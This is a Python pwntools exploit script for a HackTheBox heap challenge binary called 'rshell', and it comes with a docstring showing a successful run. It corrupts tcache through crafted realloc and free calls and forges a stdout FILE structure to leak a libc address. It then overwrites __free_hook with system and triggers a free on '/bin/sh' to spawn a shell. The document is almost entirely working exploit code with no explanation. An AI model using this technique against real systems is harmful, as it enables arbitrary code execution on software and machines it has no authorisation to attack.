from pwn import *




"""
+] Starting local process './rshell': pid 10650
[*] '/home/d4mian/Pwning/HackTheBox/rshell'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/d4mian/Pwning/HackTheBox/libc6_2.29-0ubuntu2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
('\n\x00B3L\x7f\x00\x00', 8)
[*] LEAK:   0x7f4c33420000
[*] LIBC:   0x7f4c33241000
[*] __realloc_hook:   0x7f4c33425c28
[*] Switching to interactive mode
$ ls
core        libc.so.6               rshell      rshell.py
leaks.bin   libc6_2.29-0ubuntu1_amd64.deb  rshell.i64  rshell.zip
leaks_.bin  libc6_2.29-0ubuntu2_amd64.so   rshell.md   rshell_info
$ whoami
d4mian
$  
"""



def allocate(name, size, content):
	p.sendlineafter("$ ", "add {}".format(name))
	p.sendlineafter(": ", str(size))
	if len(content) == size:
		p.sendafter(": ", content)
	else:
		p.sendlineafter(": ", content)


def free(name):
	p.sendlineafter("$ ", "rm {}".format(name))

def realloc(name, size, content=None):
	p.sendlineafter("$ ", "edit {}".format(name))
	p.sendlineafter(": ", str(size))
	if content:
		p.sendafter(": ", content)


def exploit():

	global p

	p = process("./rshell")

	allocate(0, 0x48, "A")
	free(0)
	
	allocate(0, 0x68, "A")
	realloc(0, 0, "")
	realloc(0, 0x18, "A")
	free(0)
	allocate(0, 0x48, "B")
	realloc(0, 0, "")
	realloc(0, 0x48, "B"*0x10)
	free(0)

	allocate(0, 0x48, "C")
	allocate(1, 0x68, b"C"*0x18+p64(0x451))

	free(1)

	for i in range(9):
		allocate(1, 0x58, "D")
		realloc(1, 0x70, "D")
		free(1)

	allocate(1, 0x58, "A")
	free(1)
	realloc(0, 0, "")
	realloc(0, 0x38, p16(0x2760))

	allocate(1, 0x48, "E")
	realloc(1, 0x18, "E")
	free(1)
	realloc(0, 0x18, "E"*0x10)
	free(0)
	allocate(0, 0x48, p64(0xfbad1800)+p64(0)*3)#b"leak:".rjust(8, b"\x00"))
	if p.recv(6) == b"$ ":
		exit(1337)

	leak = p.recv(6) + b"\x00"*2
	leak = int(hex(u64(leak)), 16)
	print(leak)
	log.info("LEAK:   0x%x" %(leak))
	libc.address = leak - 0x1b2634
	log.info("LIBC:   0x%x" %(libc.address))
	log.info("LIBC:   0x%x" %(libc.address))

	log.info("__free_hook:   0x%x" %(libc.sym['__free_hook']))
	p.sendline("")
	context.log_level = "debug"

	allocate(1, 0x70, "F")
	realloc(1, 0, "")

	realloc(1, 0x18, "F"*0x10)
	free(1)

	allocate(1, 0x70, b"F"*0x18+p64(0x41)+p64(libc.sym["__free_hook"] - 0x8))
	free(1)

	allocate(1, 0x58, "G")
	realloc(1, 0x28, "G")
	free(1)

	allocate(1, 0x58, b"/bin/sh\x00" + p64(libc.sym['system']))

	p.sendlineafter("$ ", "rm 1")
	p.interactive()


if __name__ == '__main__':
	elf = ELF("rshell")
	libc = elf.libc
	exploit()

